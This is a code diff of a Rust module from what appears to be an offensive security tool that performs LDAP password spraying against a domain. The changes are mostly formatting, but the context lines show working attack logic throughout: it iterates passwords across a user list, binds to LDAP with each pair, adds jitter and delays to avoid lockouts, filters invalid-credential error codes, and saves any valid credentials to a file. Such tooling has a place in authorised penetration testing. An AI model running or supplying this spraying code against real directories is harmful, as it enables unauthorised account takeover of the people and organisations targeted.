@@ -1,17 +1,17 @@
 use crate::args::ProxyConfig;
 use crate::args::SprayArgs;
+use crate::help::add_terminal_spacing;
 use crate::help::print_timestamp;
 use chrono::Local;
-use ldap3::{LdapConn};
+use ldap3::LdapConn;
 use rand::Rng;
 use std::error::Error;
 use std::fs::File;
 use std::io::{self, BufRead, Write};
+use std::net::TcpStream;
 use std::path::Path;
 use std::thread;
 use std::time::Duration;
-use std::net::TcpStream;
-use crate::help::add_terminal_spacing;
 
 pub struct SprayConfig {
     pub userfile: String,
@@ -90,23 +90,21 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
     let mut attempt_count = 0;
 
     for (password_index, password) in passwords.iter().enumerate() {
-        println!("\n[*] Testing password: '{}' ({}/{} passwords)", 
-            password, 
+        println!(
+            "\n[*] Testing password: '{}' ({}/{} passwords)",
+            password,
             password_index + 1,
             passwords.len()
         );
-        
+
         for (_user_index, user) in users.iter().enumerate() {
             attempt_count += 1;
             let progress_percentage = (attempt_count as f64 / total_attempts as f64 * 100.0) as u32;
-            
+
             // Show attempt details with percentage
-            println!("[*] [{:3}%] Attempting login: {}@{} ({}/{} attempts)", 
-                progress_percentage,
-                user, 
-                config.domain,
-                attempt_count,
-                total_attempts
+            println!(
+                "[*] [{:3}%] Attempting login: {}@{} ({}/{} attempts)",
+                progress_percentage, user, config.domain, attempt_count, total_attempts
             );
 
             // Add random delay between 0-X seconds if jitter is enabled
@@ -114,19 +112,19 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
                 let delay = rand::thread_rng().gen_range(0..config.jitter);
                 thread::sleep(Duration::from_millis(delay as u64));
             }
-            
+
             match try_login(&ldap_url, user, &password, &config.domain) {
                 Ok(true) => {
                     if found_creds.is_none() {
                         found_creds = Some(File::create(&output_file)?);
                     }
-                    
+
                     let success_msg = format!(
                         "[+] Valid credentials found!\n    Username: {}\n    Password: {}\n    Domain: {}\n    Server: {}\n",
                         user, password, config.domain, ldap_url
                     );
                     println!("\x1b[32m{}\x1b[0m", success_msg.trim());
-                    
+
                     if let Some(file) = &mut found_creds {
                         file.write_all(success_msg.as_bytes())?;
                         file.flush()?;
@@ -140,21 +138,26 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
                 }
                 Ok(false) => {
                     if config.verbose {
-                        println!("[-] Failed login: {}@{} with password: {}", 
-                            user, config.domain, password);
+                        println!(
+                            "[-] Failed login: {}@{} with password: {}",
+                            user, config.domain, password
+                        );
                     }
                 }
                 Err(e) => {
-                    if !e.to_string().contains("rc=49") && 
-                       !e.to_string().contains("invalidCredentials") && 
-                       !e.to_string().contains("AcceptSecurityContext error") {
+                    if !e.to_string().contains("rc=49")
+                        && !e.to_string().contains("invalidCredentials")
+                        && !e.to_string().contains("AcceptSecurityContext error")
+                    {
                         eprintln!(
                             "\x1b[33m[!] Connection Error: {}@{} - {}\x1b[0m",
                             user, config.domain, e
                         );
                     } else if config.verbose {
-                        println!("[-] Failed login: {}@{} with password: {}", 
-                            user, config.domain, password);
+                        println!(
+                            "[-] Failed login: {}@{} with password: {}",
+                            user, config.domain, password
+                        );
                     }
                 }
             }
@@ -164,8 +167,9 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
                 thread::sleep(Duration::from_secs(config.delay));
             }
         }
-        
-        println!("\n[*] Completed password: '{}' - Progress: {}/{} ({}%)", 
+
+        println!(
+            "\n[*] Completed password: '{}' - Progress: {}/{} ({}%)",
             password,
             password_index + 1,
             passwords.len(),
@@ -176,14 +180,22 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
     println!("\n[*] Password spray complete");
     println!("[*] Total attempts: {}", attempt_count);
     if valid_credentials_found {
-        println!("[+] Valid credentials were found and saved to: {}", output_file);
+        println!(
+            "[+] Valid credentials were found and saved to: {}",
+            output_file
+        );
     } else {
         println!("[-] No valid credentials were found");
     }
     Ok(())
 }
 
-fn try_login(ldap_url: &str, username: &str, password: &str, domain: &str) -> Result<bool, Box<dyn Error>> {
+fn try_login(
+    ldap_url: &str,
+    username: &str,
+    password: &str,
+    domain: &str,
+) -> Result<bool, Box<dyn Error>> {
     // Create LDAP connection
     let mut ldap = match LdapConn::new(ldap_url) {
         Ok(conn) => conn,
@@ -197,17 +209,18 @@ fn try_login(ldap_url: &str, username: &str, password: &str, domain: &str) -> Re
     match ldap.simple_bind(&bind_dn, password) {
         Ok(result) => {
             match result.success() {
-                Ok(_) => Ok(true),  // Successful login
-                Err(_) => Ok(false) // Failed login
+                Ok(_) => Ok(true),   // Successful login
+                Err(_) => Ok(false), // Failed login
             }
-        },
+        }
         Err(e) => {
             let error_string = e.to_string();
             // Check if this is an invalid credentials error (code 49)
-            if error_string.contains("rc=49") || 
-               error_string.contains("invalidCredentials") || 
-               error_string.contains("AcceptSecurityContext error") {
-                Ok(false)  // Invalid credentials - failed login
+            if error_string.contains("rc=49")
+                || error_string.contains("invalidCredentials")
+                || error_string.contains("AcceptSecurityContext error")
+            {
+                Ok(false) // Invalid credentials - failed login
             } else {
                 // Only real connection errors should be reported as errors
                 Err(Box::new(e))
